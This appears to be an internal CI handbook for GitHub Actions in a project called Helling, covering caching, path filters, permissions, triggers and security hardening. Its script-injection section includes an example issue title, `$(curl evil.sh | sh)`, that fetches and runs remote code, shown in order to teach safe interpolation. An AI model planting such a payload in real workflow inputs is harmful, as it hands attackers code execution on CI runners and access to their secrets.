# Helling CI Reference & Optimization Handbook

**Scope:** GitHub Actions on GitHub-hosted runners, tuned for Helling.
**Skipped:** Actions Runner Controller, runner scale sets, runner groups, custom runner images, self-hosted runners. Revisit when Helling's K8s platform dogfoods its own CI.
**Date:** 2026-04-21. Anchor version of `actions/cache` = `v5.0.5`.

---

## 0. Framing - what this doc is and isn't

This is a reference, not a to-do list. Not all of it applies to Helling today; some sections are here so you have a single place to look when you hit the situation later (e.g. service containers when Postgres integration tests land). The sections split into three categories:

- **APPLIES NOW** - concrete wins for Helling's current `quality.yml` and `security.yml`.
- **APPLIES LATER** - mechanics you'll need when specific things land (DB tests, releases, frontend scale).
- **DO NOT USE / TRAP** - things that sound useful but aren't, for reasons specific to your repo or to GitHub Actions semantics.

**Critical framing fact for Helling:** the repo is public. GitHub-hosted runner minutes are **unlimited and free for public repos on standard runners** - see [GitHub's pricing docs](https://docs.github.com/en/billing/reference/actions-runner-pricing). This means:

- Cost optimization is not a real goal. Speed is. You're optimizing developer wait time, not a bill.
- "Burn a job" is cheap. Splitting work into more parallel jobs to reduce wall-clock time is the dominant strategy, not consolidating work into fewer jobs.
- Larger runners cost money even in public repos - avoid unless a specific job genuinely needs >7GB RAM or >4 cores.

---

## 1. Measure before optimizing

Don't refactor CI based on feelings. Every optimization below should be validated against numbers.

### 1.1 Where to look in the UI

1. **Actions tab -> a workflow run -> the Summary page.** Scroll to "Jobs" - wall-clock duration per job is right there.
2. **Actions tab -> any workflow -> `...` menu -> "Workflow usage"** - shows total minutes billed per job over the last month. On a free public repo this reads zero, but the _duration data_ still surfaces there.
3. **Inside a job's log -> any step's group.** Look for `Post Set up Go` / `Post Cache` steps at the end - these are where caches get saved. The lines `Cache hit for key: ...` vs `Cache not found for input keys: ...` tell you if you have a cache problem.
4. **Actions -> Insights** (organization level). Aggregated workflow run duration percentiles. Most useful for "is p95 getting worse."

### 1.2 Budget table (use this as your target)

For a developer-feedback loop, the tolerance for CI latency is roughly:

| Wall-clock time | Developer behaviour                               |
| --------------- | ------------------------------------------------- |
| < 2 min         | They wait watching the tab                        |
| 2-5 min         | They context-switch                               |
| 5-10 min        | They forget about the PR                          |
| 10-30 min       | They start batching multiple PRs                  |
| > 30 min        | They stop reviewing each other's PRs in real time |

Helling's `quality.yml` runs 12 jobs in parallel. The wall-clock time of the workflow equals the slowest job, not the sum. That makes the critical-path job the only thing that matters.

### 1.3 Estimated critical path for Helling's current `quality.yml`

Based on what each job does, assuming no caching:

| Job                 | Est. cold time | Est. warm time | Can it be warm?                                  |
| ------------------- | -------------- | -------------- | ------------------------------------------------ |
| `openapi`           | ~30s           | ~15s           | SHA256 check is fast, no dep to cache            |
| `openapi-generated` | ~45s           | ~20s           | Go build cache warms it                          |
| `markdown`          | ~60s           | ~30s           | npm install global prettier every run            |
| `yaml`              | ~25s           | ~15s           | pip install yamllint every run                   |
| `shell`             | ~90s           | ~20s           | `go install shfmt` compiles 2 MB of Go every run |
| `go`                | ~4-6 min       | ~2-3 min       | Go build + test + race + lint + vuln - the beast |
| `frontend`          | ~90s           | ~45s           | Bun cache helps; tsc is the long pole            |
| `sql`               | ~60s           | ~30s           | pipx + go install goose compile every run        |
| `secrets`           | ~20s           | ~20s           | gitleaks is fast, no caching needed              |
| `spelling`          | ~10s           | ~10s           | typos binary, ~2 MB download                     |
| `links`             | ~15s           | ~15s           | offline check, nothing to cache                  |
| `parity`            | ~20s           | ~15s           | tiny                                             |

**Critical path: the `go` job at 4-6 minutes cold, 2-3 minutes warm.** Everything else can fall in line behind that. So the #1 optimization is making the `go` job fast and reliable, and caching the Go toolchain-installed binaries across workflows.

---

## 2. APPLIES NOW - high-leverage wins for Helling

### 2.1 Dependency caching

**The rule:** every tool installed at workflow-time should be cached, keyed on the file that pins its version.

#### 2.1.1 Go build & test cache

`actions/setup-go@v6` with `cache: true` already handles `$GOCACHE` and `$GOMODCACHE` for you. The cache key is the hash of `go.sum`. This is good. You already have it.

#### 2.1.2 Go-installed binary tools - the big miss

Every `go install x@version` in your workflow recompiles that tool from source on a fresh VM. You have four of these:

```yaml
go install mvdan.cc/sh/v3/cmd/shfmt@v3.9.0              # ~15s compile
go install golang.org/x/vuln/cmd/govulncheck@v1.1.3     # ~20s compile
go install github.com/pressly/goose/v3/cmd/goose@v3.21.1 # ~15s compile
```

These compile on every run. Cache them:

```yaml
- name: Cache Go-installed binaries
  uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
  with:
    path: ~/go/bin
    key: ${{ runner.os }}-go-bin-${{ hashFiles('.github/workflows/quality.yml') }}
    restore-keys: |
      ${{ runner.os }}-go-bin-
```

The key uses `hashFiles('.github/workflows/quality.yml')` because that's where the versions live. When you bump `shfmt@v3.13.1`, the hash changes and you recompile once. The `restore-keys` block lets you get a partial match (any previous build of your tools) so the first bump is still ~15s not ~50s.

**Savings:** ~50s off the `shell` + `go` + `sql` jobs combined, deterministically.

Alternative pattern if you want finer granularity:

```yaml
- uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
  with:
    path: ~/go/bin/shfmt
    key: ${{ runner.os }}-shfmt-v3.9.0
```

Don't combine that with the broad `~/go/bin` key - caches are mutually exclusive per path, and GitHub will clobber.

#### 2.1.3 pipx / pip caches

`pipx install sqlfluff==3.0.7` downloads and installs from PyPI every run. Python pip has a cache at `~/.cache/pip`. Cache it:

```yaml
- uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
  with:
    path: |
      ~/.cache/pip
      ~/.local/pipx
    key: ${{ runner.os }}-pip-sqlfluff3.0.7-yamllint1.35.1-pyyaml6.0.2
```

`sqlfluff` pulls ~30 MB of wheels; this saves roughly 20-30s on the `sql` job.

#### 2.1.4 npm global prettier

`npm i -g prettier@3.3.3` in the `markdown` job. Consider a cache or switch to pre-installed: the `ubuntu-24.04` image [ships with a Node toolchain](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md) and `npx prettier@3.3.3` has a version-pinned npx resolver, so you can sidestep the global install entirely:

```yaml
- run: npx -y prettier@3.3.3 --check '**/*.md' --ignore-path .gitignore
```

`npx -y` auto-accepts the download prompt. The binary is cached in `~/.npm` between invocations within a job, but across jobs you'd need to add:

```yaml
- uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-prettier-3.3.3
```

Savings: ~15-20s.

#### 2.1.5 vacuum / grype / syft / sqlc - binary download cache

These are single-binary downloads with SHA256 checksums. The download itself is 10-40 MB. Cache them:

```yaml
- uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
  id: vacuum-cache
  with:
    path: /usr/local/bin/vacuum
    key: ${{ runner.os }}-vacuum-0.16.5

- name: Install vacuum
  if: steps.vacuum-cache.outputs.cache-hit != 'true'
  env:
    VACUUM_VERSION: "0.16.5"
    VACUUM_SHA256: "68ed0b45..."
  run: |
    # ... existing install logic
```

The `if: steps.vacuum-cache.outputs.cache-hit != 'true'` skips the install when cached. That's what `cache-hit` is for. **Gotcha:** writing to `/usr/local/bin` needs `sudo`, and `actions/cache` handles the restore as the GHA user - if your cached binary has wrong ownership, the cache save fails silently. Cache into `~/.local/bin` and add it to `$PATH` instead:

```yaml
- run: echo "$HOME/.local/bin" >> $GITHUB_PATH
```

`$GITHUB_PATH` is a workflow command - appending a line to this file adds the path for subsequent steps in the same job.

#### 2.1.6 Cache key design rules

1. **Key on the thing that invalidates.** For `go.sum` dependencies, `hashFiles('**/go.sum')`. For versioned tools, the version string. For a compiled binary keyed on workflow file, `hashFiles('.github/workflows/xyz.yml')`.
2. **Include the OS.** `${{ runner.os }}-...` - ubuntu and macos caches are not interchangeable.
3. **`restore-keys` are hierarchical.** Exact match -> partial prefix match -> even broader. The broader ones let a cache miss still warm-start on a "close enough" previous cache.
4. **Immutable after write.** You cannot update a cache entry - only create a new one with a new key. Caches are evicted after 7 days of no access, or to keep the repo under 10 GB total cache storage (LRU eviction).

#### 2.1.7 Cache size limits

- **10 GB per repository** total cache storage.
- Individual caches can be up to 10 GB.
- LRU eviction when the repo total hits the cap.
- Caches are scoped to a branch. A branch cache is visible to PRs targeting that branch and to the branch itself. `main`'s caches are visible everywhere.

This last point matters: if you have a feature branch that creates a large cache, it's isolated until it merges. On first push to a new branch, you get `main`'s caches as a warm start.

### 2.2 Composite action - dedupe the setup sequence

You call `actions/checkout` in 12 jobs and `actions/setup-go` in 4 jobs. Every time you want to bump a SHA, that's 12 edits. Factor the common setup into a composite action:

**File: `.github/actions/setup-go-env/action.yml`**

```yaml
name: Setup Go environment
description: Checkout, install Go, and cache toolchain binaries
inputs:
  go-version:
    description: Go version
    default: "1.26"
  cache-go:
    description: Whether to cache Go build/test caches
    default: "true"
runs:
  using: composite
  steps:
    - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

    - uses: actions/setup-go@4b73464bb391d4059bd26b0524d20df3927bd417 # v6.3.0
      with:
        go-version: ${{ inputs.go-version }}
        cache: ${{ inputs.cache-go }}

    - name: Cache Go-installed binaries
      uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
      with:
        path: ~/go/bin
        key: ${{ runner.os }}-go-bin-${{ hashFiles('.github/workflows/*.yml') }}
        restore-keys: ${{ runner.os }}-go-bin-
```

Then in `quality.yml`:

```yaml
jobs:
  shell:
    steps:
      - uses: ./.github/actions/setup-go-env
      # ...
  go:
    steps:
      - uses: ./.github/actions/setup-go-env
      # ...
```

**Gotchas:**

- Composite actions must live in `.github/actions/<name>/action.yml` (or any directory - but this is the convention).
- You reference a local composite with `./.github/actions/<name>` - starts with `./`, not a slash.
- Composite `runs:` steps can be a mix of `uses:` and `run:`. `run:` in a composite **requires** an explicit `shell:` key - there's no default. (`shell: bash`, normally.)
- Inputs in composites don't have access to `secrets` - pass them as explicit inputs.
- Composite actions **cannot contain `uses:` references that are themselves not pinned** if you care about ADR-026.

**Trade-off:** you create a new abstraction layer. When something breaks, you have one more file to look in. For Helling's 12-job pattern, it's worth it; for a 3-job workflow it wouldn't be.

### 2.3 Path filters - skip jobs when their files didn't change

Right now, a PR that changes only `README.md` runs all 12 jobs including the full Go test suite. That's waste. Use [`dorny/paths-filter`](https://github.com/dorny/paths-filter):

```yaml
jobs:
  changes:
    runs-on: ubuntu-24.04
    outputs:
      go: ${{ steps.filter.outputs.go }}
      frontend: ${{ steps.filter.outputs.frontend }}
      sql: ${{ steps.filter.outputs.sql }}
      docs: ${{ steps.filter.outputs.docs }}
      openapi: ${{ steps.filter.outputs.openapi }}
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - uses: dorny/paths-filter@fbd0ab8f3e69293af611ebaee6363fc25e6d187d # v4.0.1
        id: filter
        with:
          filters: |
            go:
              - '**/*.go'
              - 'go.mod'
              - 'go.sum'
              - 'apps/**'
              - 'internal/**'
            frontend:
              - 'web/**'
            sql:
              - 'db/**'
              - 'internal/store/**'
              - 'sqlc.yaml'
            docs:
              - '**/*.md'
              - 'docs/**'
            openapi:
              - 'api/**'
              - 'tools/openapi-dump/**'

  go:
    needs: changes
    if: needs.changes.outputs.go == 'true'
    # ... rest of job
```

**Critical trap #1 - required status checks.** If you mark the `go` job as a required check for merge to `main`, and a docs-only PR skips it, the PR is **blocked forever** waiting for a check that never runs. Two fixes:

- Make the _workflow_ required instead of the job (some branch protection setups allow this, others don't cleanly).
- Emit a skipped-but-successful sentinel job. Most common pattern:

```yaml
jobs:
  # ... your conditional jobs
  ci-complete:
    if: always()
    needs:
      [
        go,
        frontend,
        sql,
        markdown,
        yaml,
        shell,
        openapi,
        openapi-generated,
        secrets,
        spelling,
        links,
        parity
      ]
    runs-on: ubuntu-24.04
    steps:
      - name: Check all jobs succeeded or skipped
        run: |
          results='${{ toJSON(needs) }}'
          echo "$results" | jq -e 'to_entries | all(.value.result == "success" or .value.result == "skipped")'
```

Then mark `ci-complete` as the required check. `always()` makes it run regardless of prior failures, and the jq evaluates the `needs` context to confirm nothing failed.

**Critical trap #2 - PR base branch.** `dorny/paths-filter` needs both the PR head and base to diff against. It handles this automatically on `pull_request`, but on `push` it diffs against the previous push - which is usually what you want for a main-branch push but surprising otherwise.

**Savings for Helling:** a docs-only PR drops from ~6 min to ~30 s. A frontend-only PR drops to ~90 s.

### 2.4 `timeout-minutes` on every job

Every job has a default `timeout-minutes` of **360** (6 hours). A runaway test or a hung network call will eat 6 hours of minutes before getting killed. Even on free public repo runners, this blocks a runner slot.

Set a realistic ceiling per job:

```yaml
jobs:
  go:
    timeout-minutes: 15
  frontend:
    timeout-minutes: 10
  markdown:
    timeout-minutes: 5
  # etc.
```

Helling's jobs should all complete in under 10 minutes in the worst case. Set each to 2-3x the observed p95, not the average.

**Why this matters for a public repo:** though minutes are free, GitHub gives you a [concurrent job limit](https://docs.github.com/en/actions/reference/limits). For GitHub Free plan, public repos: **20 concurrent Linux jobs**. A hung job eats one of those for 6 hours.

### 2.5 Permissions hardening per-job

Your top-level `permissions: contents: read` is already minimum. Most jobs don't need `pull-requests: read` either - drop it at the top level, and add it only to jobs that actually read PR metadata (currently none of yours do).

```yaml
# top-level
permissions:
  contents: read

jobs:
  secrets:
    permissions:
      contents: read
      pull-requests: read # gitleaks-action reads PR diff
```

General rule: **start with nothing, add what fails.** If you omit `permissions:` entirely, GH defaults to the restrictive `GITHUB_TOKEN` scope for the workflow; explicit is better because it documents intent.

Jobs that typically need escalated permissions:

| Job type                  | Permissions needed                                   |
| ------------------------- | ---------------------------------------------------- |
| Upload SARIF              | `security-events: write`                             |
| Upload build attestations | `id-token: write`, `attestations: write`             |
| Comment on PRs            | `pull-requests: write`                               |
| Publish releases          | `contents: write`                                    |
| Push back to the repo     | `contents: write` (avoid - use a PR-creating action) |
| OIDC to cloud             | `id-token: write`                                    |

### 2.6 The refactored shape - visualized

```flow
BEFORE (what you have today):
  PR opens
    ↓
  all 12 jobs start in parallel
    ↓
  each does: checkout + setup-go + install tools + work
    ↓
  slowest job (go) wins at ~4-6 min
    ↓
  total CI time = 4-6 min

AFTER (what this section gets you):
  PR opens
    ↓
  changes filter runs (~10s)
    ↓
  only affected jobs start
    ↓
  each uses: composite setup action + cached binaries
    ↓
  go job now ~2 min (tools pre-compiled in cache)
    ↓
  total CI time = 2-3 min for typical PR
                = 30 sec for docs-only PR
```

**Net expected wall-clock reduction:** ~40-50% on typical PRs, ~90% on docs-only PRs.

---

## 3. Correctness & security

### 3.1 Script injection - audit of your current workflows

**The threat:** if an attacker can get content into a context value that gets interpolated into a shell command, they can execute arbitrary code on your runner. The classic:

```yaml
- run: echo "Title: ${{ github.event.issue.title }}"   # UNSAFE
```

An issue title of `$(curl evil.sh | sh)` becomes shell code.

**Audit result for Helling's workflows as of 2026-04-21:**

- `security.yml`: no user-controlled inputs interpolated into `run:` blocks
- `quality.yml`: no user-controlled inputs interpolated into `run:` blocks
- `codeql.yml`: no user-controlled inputs interpolated into `run:` blocks

You're clean. Keep it that way.

**Safe patterns when you DO need user input:**

```yaml
# UNSAFE
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE: via env
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

Why this works: `env:` values go into the shell environment as literal strings; shell quoting protects them. Interpolating directly into the `run:` body is textual substitution before the shell even starts - the shell can't defend against it.

**What counts as user input:** anything the attacker could craft, including:

- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `...body`, `...head.ref` (branch name)
- `github.event.comment.body`
- `github.head_ref` (PR branch name on `pull_request_target`)
- `github.event.workflow_run.head_commit.message`
- Any input to a `workflow_dispatch` that the actor can control

### 3.2 `pull_request_target` - the footgun

Do not use `pull_request_target` unless you've audited every line. The difference:

- `pull_request`: runs in the _PR's_ context, with **read-only** `GITHUB_TOKEN`, and **no access to secrets** if the PR is from a fork.
- `pull_request_target`: runs in the _base branch_'s context, with **full write-capable** `GITHUB_TOKEN`, and **full secret access**, even for fork PRs.

A fork PR author can modify your workflow file to do anything if you `checkout` the PR head in a `pull_request_target` job. The [canonical warning from GitHub](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) is that this has been exploited in the wild to exfiltrate secrets.

**Rule:** if you think you need `pull_request_target`, reconsider. The two legitimate uses are:

1. Labelling PRs from forks (needs write token, doesn't need to check out PR code).
2. Running CI on fork PRs when you accept the security model.

For Helling: you don't need it. Don't add it.

### 3.3 Third-party action vetting

Your workflows use actions from: `actions/*`, `github/*`, `ossf/*`, `anchore/*`, `golangci/*`, `DavidAnson/*`, `oven-sh/*`, `gitleaks/*`, `crate-ci/*`, `lycheeverse/*`, `dorny/*` (if you adopt paths-filter).

For each, verify:

1. **Owner reputation.** First-party (`actions/*`, `github/*`) is trusted. Second-party (org behind the tool, like `anchore/scan-action` by Anchore) is next-best. Individual accounts (like `DavidAnson`) - check stars, last commit activity, whether other major projects use them.
2. **SHA pinning.** Non-negotiable per ADR-026.
3. **Permissions footprint.** What token scopes does it request?
4. **Network egress.** Does it call out to third-party APIs with your secrets? `anchore/scan-action` does (telemetry - disable via `ANCHORE_CI=true`).

**A minimal vetting ritual:** before adopting a new third-party action, read its `action.yml`. If it's a JS action, spot-check `dist/index.js` for obvious exfiltration (search for `http`, `fetch`, `request`). If it's a composite, read every step. If it's a Docker action, read the Dockerfile.

This takes 5 minutes and catches most bad actors.

### 3.4 Compromised-runner posture

Public GitHub-hosted runners are shared-tenancy VMs. GitHub treats them as ephemeral - a fresh VM per job, destroyed after. You get:

- Network egress allowed by default (open internet).
- No persistent state between jobs (caches and artifacts are the exception).
- `GITHUB_TOKEN` scoped to what your `permissions:` block says.

Threat model for a compromised runner:

- **Your secrets** - limited to whatever you pass in via `${{ secrets.* }}` or via `env`. Tightly scope repo-level secrets; prefer environment secrets gated by branch protection.
- **Your cache** - an attacker with runner access can poison caches. If your workflow pulls a cache, then writes source to it, then another run pulls the poisoned cache, you have an RCE chain. Mitigation: use cache **paths you control**, and key strictly.
- **The `GITHUB_TOKEN`** - if you have `contents: write`, the token can push to the repo. On PR events, the token is read-only by default for fork PRs.
- **Egress to cloud providers via OIDC** - `id-token: write` lets the runner mint tokens for cloud providers. Scope the cloud-side trust policy to the exact repo + branch + workflow path.

**Concrete Helling mitigations you already have:**

- SHA-pinned actions (ADR-026)
- `permissions: contents: read` at top-level
- No `pull_request_target`
- No custom network-egress filters (GH doesn't offer these on hosted runners - self-hosted territory)

### 3.5 Secrets scoping

- **Repository secrets** (`settings -> Secrets and variables -> Actions`) - visible to all workflows in the repo.
- **Environment secrets** - gated on `environment:` block in a job; can require approvers and restrict branch patterns.
- **Organization secrets** - across repos, useful for shared things like a container registry token.

For Helling today, one repo secret matters: `GITLEAKS_LICENSE`. Keep it simple. If/when you add deployment, create environments (`production`, `staging`) and scope deploy tokens to the `production` environment with `prod` branch protection. That way a PR cannot accidentally deploy.

**`GITHUB_TOKEN` never needs to be declared as a secret.** It's auto-injected. Just reference `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}` (same thing).

---

## 4. Reusable structure - composites, reusable workflows, matrices

### 4.1 Composite actions vs reusable workflows - which when

| Capability                      | Composite action         | Reusable workflow                                  |
| ------------------------------- | ------------------------ | -------------------------------------------------- |
| Reuses **steps** within a job   | Yes                      | No                                                 |
| Reuses **entire jobs**          | No                       | Yes                                                |
| Can specify `runs-on`           | No (inherits)            | Yes                                                |
| Supports `secrets:` inheritance | No (must pass as inputs) | Yes via `secrets: inherit`                         |
| Has own permissions block       | No                       | Yes                                                |
| Callable from another repo      | Yes                      | Yes                                                |
| Nesting limit                   | 10 deep                  | 4 deep                                             |
| Syntax home                     | `action.yml`             | `.github/workflows/*.yml` with `on: workflow_call` |

**Heuristic:**

- Factoring `checkout + setup-go + setup-cache` across 4 jobs -> **composite**.
- Running the exact same pipeline against main and release branches, or from a second workflow -> **reusable workflow**.
- Calling from another repo's CI -> **reusable workflow** (composite is technically callable but awkward across repos).

For Helling today: composite is the right tool for the setup-sequence dedup (Section 2.2). Reusable workflow is overkill unless you end up running the same 12-job pipeline from multiple entry points.

### 4.2 Matrix strategies - when matrix, when sequential, when needs-chain

Matrix is for _the same job running against N variations of an input_. Not for parallelising different things.

**Bad use:**

```yaml
strategy:
  matrix:
    task: [build, test, lint] # these are different things - use jobs
```

**Good use:**

```yaml
strategy:
  matrix:
    go-version: ["1.25", "1.26"]
    os: [ubuntu-24.04, macos-14]
    exclude:
      - os: macos-14
        go-version: "1.25"
```

For Helling, the `codeql.yml` `language: [go, javascript-typescript]` matrix is correct - one job template, two language runs.

**`fail-fast`:** default is `true` - one failure kills siblings. Set `fail-fast: false` when you want full coverage before failing (you want to see both Go and JS CodeQL results, not just the first failure). Helling's codeql.yml sets this correctly.

**`max-parallel`:** throttle matrix concurrency. Useful when your downstream (e.g. a staging DB) can't handle N parallel connections. Not useful for Helling's current workflows.

### 4.3 Needs graph & passing data between jobs

**Data passing options:**

1. **Job outputs** - small strings. Max 1 MB across all outputs of a job. Fast.

   ```yaml
   jobs:
     build:
       outputs:
         version: ${{ steps.set.outputs.version }}
       steps:
         - id: set
           run: echo "version=1.2.3" >> $GITHUB_OUTPUT
     release:
       needs: build
       steps:
         - run: echo "Releasing ${{ needs.build.outputs.version }}"
   ```

2. **Artifacts** - larger data, binary-safe. Use `actions/upload-artifact@v7` in the producer, `actions/download-artifact@v6` in the consumer. Artifacts are scoped to the workflow run and auto-delete after 90 days by default (configurable per repo).

3. **Cache** - **do not use cache for cross-job data passing.** Cache keys can miss, and cross-job coordination via cache is a race condition.

**Needs graph gotchas:**

- `if: always()` on a job that `needs: [a, b]` still doesn't run if `a` or `b` was _skipped_. Use `if: ${{ !cancelled() }}` to run even after skipped deps. Use `if: always()` for "run no matter what, including after failure." They sound the same; they aren't.
- When job B `needs: A`, B runs after A succeeds. If you want B to run regardless of A's result (e.g. cleanup), `needs: A` + `if: always()`.
- The `needs` context gives you `.result` (`success`/`failure`/`cancelled`/`skipped`) and `.outputs.*`.

### 4.4 `steps.*` outputs and `$GITHUB_OUTPUT`

Inside a step, emit outputs:

```yaml
steps:
  - id: version
    run: echo "tag=v1.2.3" >> $GITHUB_OUTPUT
  - run: echo "Found ${{ steps.version.outputs.tag }}"
```

`$GITHUB_OUTPUT` is a file path the runner gives you; append `key=value` lines to it. Multi-line values need the heredoc form:

```yaml
- id: notes
  run: |
    echo "body<<EOF" >> $GITHUB_OUTPUT
    cat CHANGELOG.md >> $GITHUB_OUTPUT
    echo "EOF" >> $GITHUB_OUTPUT
```

The deprecated `::set-output` syntax will not work - it was removed in 2023.

---

## 5. Events, triggers, concurrency

### 5.1 Events cheat sheet

| Event                                                    | Fires on                                                | Use for                             |
| -------------------------------------------------------- | ------------------------------------------------------- | ----------------------------------- |
| `push`                                                   | Any push to the repo                                    | CI on protected branches            |
| `pull_request`                                           | PR opened, synchronised, reopened, etc.                 | CI on PRs (safe default)            |
| `pull_request_target`                                    | Same as above BUT runs in base context with write perms | **Avoid** unless you know           |
| `schedule`                                               | cron expression, in UTC                                 | Nightly scans, weekly health checks |
| `workflow_dispatch`                                      | Manual trigger from UI or API                           | Ops, deploys, backfills             |
| `workflow_run`                                           | Another workflow finished                               | Cascading workflows                 |
| `release`                                                | Release published/edited                                | Artifact upload, distribution       |
| `issues`, `issue_comment`, `pull_request_review_comment` | Issue/PR activity                                       | Labelling bots, responders          |
| `push` with `tags:` filter                               | A tag is pushed                                         | Release builds                      |

**Filters:**

```yaml
on:
  push:
    branches: [main, "release/**"]
    paths: ["src/**", "go.sum"]
    paths-ignore: ["**.md"] # cannot use `paths` + `paths-ignore` together
    tags: ["v*"]
  pull_request:
    types: [opened, synchronize, reopened] # default set
    branches: [main]
```

**Gotcha:** `paths:` and `paths-ignore:` at the workflow level are **all-or-nothing** per workflow. If any path matches, the whole workflow fires, including jobs that don't care about that path. Use `dorny/paths-filter` inside the workflow (Section 2.3) for per-job conditional skip.

### 5.2 Concurrency semantics

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

Helling has this correctly. Mechanics:

- **`group`**: a string. Any two runs with the same group form a queue of size 2. When a third run enters, something gives.
- **`cancel-in-progress: true`**: the currently-running job is cancelled, the new one starts. Good for PRs - the latest push's CI is the one you care about.
- **`cancel-in-progress: false`** (default): the new run queues behind the current one. Only one runs at a time. Good for deploys where you need sequential.

Helling's pattern (cancel on PRs, queue on main pushes) is idiomatic.

**Advanced pattern - queuing deploys without cancellation:**

```yaml
concurrency:
  group: deploy-${{ github.event.inputs.environment }}
  cancel-in-progress: false
```

This ensures two deploys to `production` don't overlap, but they don't cancel each other either - they run serially.

**Gotcha:** concurrency groups are **global** within the repo. Two different workflows with `group: deploy-prod` queue against each other. Use descriptive groups.

### 5.3 Workflow queuing (what happens when you hit concurrency limits)

GitHub Free plan, public repos: 20 concurrent standard Linux jobs, 5 concurrent macOS jobs. When you exceed, jobs wait in a queue. The queue is per-account, not per-repo.

For Helling with 12 jobs running in parallel on a PR, you're using 12 of 20 slots per run. Two simultaneous PRs = 24 wanted, 4 queued. This is usually fine; peaks happen when CI for multiple branches kicks off within seconds of each other (e.g. after a dependabot batch).

**If queue times become painful:**

- Reduce the fan-out (merge related jobs).
- Use path filters (Section 2.3) to skip jobs that don't apply.
- Upgrade the plan (GitHub Team = 40 concurrent, Enterprise = 180).

For Helling, not an issue at current scale.

---

## 6. Contexts & expressions

### 6.1 Contexts (what's available where)

| Context    | What it has                                                           | Available in                          |
| ---------- | --------------------------------------------------------------------- | ------------------------------------- |
| `github`   | Event payload, repo, actor, workflow metadata                         | Everywhere                            |
| `env`      | Environment variables set in workflow/job/step                        | After `env:` is set                   |
| `vars`     | Org/repo/environment **variables** (non-secret)                       | Everywhere                            |
| `secrets`  | Encrypted secrets                                                     | Inside `run:`, `with:`, `env:`, `if:` |
| `inputs`   | `workflow_dispatch` / `workflow_call` / composite inputs              | Callee workflow/action                |
| `needs`    | `.result` and `.outputs.*` of prerequisite jobs                       | After `needs:`                        |
| `strategy` | `.fail-fast`, `.job-index`, `.job-total`, `.max-parallel`             | Matrix jobs                           |
| `matrix`   | Current matrix combination values                                     | Matrix jobs                           |
| `runner`   | `.os`, `.arch`, `.name`, `.temp`, `.tool_cache`, `.debug`             | Inside jobs                           |
| `job`      | `.status`, `.container.*`, `.services.*`                              | Inside jobs                           |
| `steps`    | `.<step-id>.outputs.*`, `.<step-id>.conclusion`, `.<step-id>.outcome` | After referenced step                 |

**Most-useful `github.*` fields:**

- `github.event_name` - `push`, `pull_request`, etc.
- `github.event.*` - full event payload (same shape as GitHub webhooks)
- `github.ref` - `refs/heads/main`, `refs/pull/123/merge`
- `github.ref_name` - `main`, `123/merge`
- `github.sha` - the commit being processed
- `github.repository` - `Bizarre-Industries/Helling`
- `github.actor` - who triggered (including bots: `dependabot[bot]`)
- `github.head_ref` - source branch on PR (empty on push)
- `github.base_ref` - target branch on PR (empty on push)
- `github.workflow` - workflow name (useful for concurrency group)

### 6.2 Expression functions

Built-in functions you'll actually use:

| Function      | Example                                                   | Returns                   |
| ------------- | --------------------------------------------------------- | ------------------------- |
| `contains`    | `contains(github.event.head_commit.message, '[skip ci]')` | boolean                   |
| `startsWith`  | `startsWith(github.ref, 'refs/tags/v')`                   | boolean                   |
| `endsWith`    | `endsWith(github.event.pull_request.title, '[WIP]')`      | boolean                   |
| `format`      | `format('{0}-{1}', runner.os, matrix.go-version)`         | string                    |
| `join`        | `join(fromJSON('["a","b"]'), '-')` -> `a-b`               | string                    |
| `toJSON`      | `toJSON(github.event)`                                    | string (useful for debug) |
| `fromJSON`    | `fromJSON(needs.setup.outputs.matrix)`                    | object                    |
| `hashFiles`   | `hashFiles('**/go.sum')`                                  | string (sha256)           |
| `success()`   | `success()` - all previous steps passed                   | boolean                   |
| `failure()`   | `failure()` - a previous step failed                      | boolean                   |
| `always()`    | `always()` - run even if cancelled/failed                 | boolean                   |
| `cancelled()` | `cancelled()` - workflow was cancelled                    | boolean                   |

**Status function precedence (critical gotcha):**

```yaml
# Run on failure, but not on cancellation:
if: ${{ failure() && !cancelled() }}

# Run always, even cancelled:
if: ${{ always() }}

# Run only when needs succeeded and this is main:
if: ${{ success() && github.ref == 'refs/heads/main' }}
```

When you `needs: [a, b]` and write `if: some-condition`, the job already has an _implicit_ `success()` check - the job won't run if `a` or `b` failed. To override, put `always()` or `!cancelled()` explicitly.

### 6.3 Safe interpolation rules

1. **Never** put `${{ anything.user_controlled }}` inside a `run:` block. Use `env:` (Section 3.1).
2. `${{ secrets.* }}` in `run:` is safe (secrets are stripped from logs), but prefer `env:` for readability.
3. Expressions in `with:` and `if:` are evaluated by the runner, not the shell - safe from shell injection but still do server-side input validation for any `workflow_dispatch` input used in a cloud-credential scope.
4. `${{ }}` inside `env:` is evaluated at job parse time; inside `run:`, the value is substituted before shell parse. Same textual substitution vulnerability, different parser.

---

## 7. Runners & images

### 7.1 `runs-on:` - always pin the image version

```yaml
runs-on: ubuntu-latest   # <- moving target
runs-on: ubuntu-24.04    # <- pinned
```

`ubuntu-latest` changes when GitHub rotates. For CI reproducibility, pin. Helling does this already. When Canonical ships `ubuntu-26.04` and GitHub offers `ubuntu-26.04` as a runner label, you can migrate on your schedule.

Image versions are documented in [`actions/runner-images`](https://github.com/actions/runner-images/tree/main/images/ubuntu). Each image ships with preinstalled tools (recent Node, Python, Go, Docker, etc.) - check the `Ubuntu2404-Readme.md` before installing something that's already there.

